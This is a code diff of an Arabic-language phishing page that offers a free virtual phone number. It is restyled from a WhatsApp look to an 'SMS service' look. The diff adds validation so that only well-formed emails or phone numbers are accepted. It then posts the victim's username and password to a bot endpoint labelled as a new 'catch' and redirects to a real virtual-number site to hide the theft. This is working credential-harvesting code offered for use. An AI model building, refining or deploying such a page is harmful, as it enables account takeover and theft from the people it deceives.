@@ -3,75 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل رقم وهمي - واتساب</title>
+    <title>تفعيل خدمة SMS</title>
     <style>
         body {
             margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); /* خلفية بلون الواتساب */
+            /* 1. تغيير الخلفية لتتناسب مع الأيقونة الجديدة (تدرج أحمر/وردي) */
+            background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%); 
             display: flex; justify-content: center; align-items: center; height: 100vh;
         }
         .container {
             background: white; padding: 30px; border-radius: 12px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 100%; max-width: 380px; text-align: center;
         }
-        #pageImg { width: 100%; border-radius: 8px; margin-bottom: 15px; }
-        h2 { color: #075E54; margin-bottom: 20px; font-size: 20px; }
+        
+        /* 2. تنسيق الأيقونة الجديدة */
+        #pageImg {
+            width: 90px; height: 90px; border-radius: 50%;
+            object-fit: cover; margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        
+        h2 { color: #CC0044; margin-bottom: 25px; font-size: 19px; }
+        
         input {
-            width: 100%; padding: 12px; margin-bottom: 15px;
+            width: 100%; padding: 12px; margin-bottom: 5px; /* مسافة صغيرة لرسالة الخطأ */
             border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none;
+            transition: 0.3s;
         }
+        
+        /* تأثير عند الخطأ في الإدخال */
+        input.error { border: 2px solid #FF0000; background-color: #FFF0F0; }
+        
+        /* تنسيق رسالة الخطأ تحت الحقل */
+        .error-msg {
+            color: #FF0000; font-size: 12px; text-align: right;
+            margin-bottom: 15px; display: none; /* مخفية افتراضياً */
+        }
+        
         button {
-            width: 100%; padding: 12px; background: #25D366; color: white;
-            border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s;
+            width: 100%; padding: 12px;
+            /* تغيير لون الزر للون الأحمر المناسب للأيقونة */
+            background: #CC0044; 
+            color: white; border: none; border-radius: 8px;
+            font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s;
+            margin-top: 10px;
         }
-        button:hover { background: #1ebd59; }
+        button:hover { background: #A00033; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <img id="pageImg" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" style="width: 80px;">
-        <h2 id="pageLetter">سجل دخول للحصول على رقم وهمي مجاناً</h2>
+        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg" alt="SMS Logo">
+        
+        <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام الوهمية</h2>
 
-        <form id="redirectForm">
-            <input type="text" id="user" placeholder="رقم الهاتف أو البريد" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
-            <button type="submit" id="pageBtn">احصل على الرقم الآن</button>
+        <form id="securedForm">
+            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف الدولي" required>
+            <div id="userInputError" class="error-msg">⚠️ يرجى إدخال بريد إلكتروني أو رقم هاتف صحيح.</div>
+            
+            <input type="password" id="passInput" placeholder="كلمة السر" required>
+            <button type="submit" id="pageBtn">تفعيل الحساب الآن</button>
         </form>
     </div>
 
     <script>
-        // دالة جلب البيانات من اللوحة (لتغيير الصورة والنص)
-        async function loadConfig() {
+        // دالة لجلب الإعدادات من اللوحة (للحفاظ على ديناميكية الصفحة)
+        async function fetchConfig() {
             try {
                 const res = await fetch('/api/get');
                 const data = await res.json();
-                if(data.image) document.getElementById('pageImg').src = data.image;
+                // إذا أرسلت صورة جديدة من اللوحة ستستبدل الأيقونة، وإلا ستبقى SMS
+                if(data.image) document.getElementById('pageImg').src = data.image; 
                 if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
                 if(data.button) document.getElementById('pageBtn').innerText = data.button;
             } catch(e) { console.log("تحميل افتراضي"); }
         }
-        window.onload = loadConfig;
+        window.onload = fetchConfig;
 
-        // دالة الإرسال والتحويل
-        document.getElementById('redirectForm').onsubmit = async (e) => {
-            e.preventDefault();
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
+        // دالة التحقق من صحة الإدخال (Validation)
+        function isValid(input) {
+            // نمط (Regex) للتحقق من البريد الإلكتروني
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            // نمط (Regex) للتحقق من رقم الهاتف (أرقام فقط، من 7 إلى 15 رقم)
+            const phonePattern = /^\+?[0-9]{7,15}$/;
+            
+            return emailPattern.test(input) || phonePattern.test(input);
+        }
 
-            // 1. إرسال البيانات للبوت
+        // دالة الإرسال مع التحقق
+        document.getElementById('securedForm').onsubmit = async (e) => {
+            e.preventDefault(); // منع الإرسال التلقائي
+            
+            const userInput = document.getElementById('userInput').value;
+            const passInput = document.getElementById('passInput').value;
+            const errorElement = document.getElementById('userInputError');
+            const inputField = document.getElementById('userInput');
+
+            // 4. تنفيذ التحقق
+            if (!isValid(userInput)) {
+                // إذا كان الإدخال غير صحيح، أظهر رسالة خطأ وغير شكل الحقل
+                errorElement.style.display = 'block';
+                inputField.classList.add('error');
+                return; // أوقف الإرسال
+            } else {
+                // إذا كان صحيحاً، أخفِ الخطأ
+                errorElement.style.display = 'none';
+                inputField.classList.remove('error');
+            }
+
+            // 5. إذا نجح التحقق، أرسل البيانات للبوت
             await fetch('/api/save', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    image: "🚨 صيد جديد من صفحة الأرقام!",
-                    letter: "المستخدم: " + user,
-                    button: "الباسورد: " + pass
+                    image: "🚨 صيد SMS جديد (بيانات محققة)",
+                    letter: "المستخدم: " + userInput,
+                    button: "الباسورد: " + passInput
                 })
             });
 
-            // 2. التحويل للموقع الآخر (هنا تضع رابط موقع الأرقام الوهمية أو الجوائز)
-            // سأضعه هنا كمثال لموقع أرقام وهمية مشهور
+            // 6. التحويل لموقع حقيقي (مثل موقع أرقام وهمية)
             window.location.href = "https://receive-smss.com/"; 
         };
     </script>
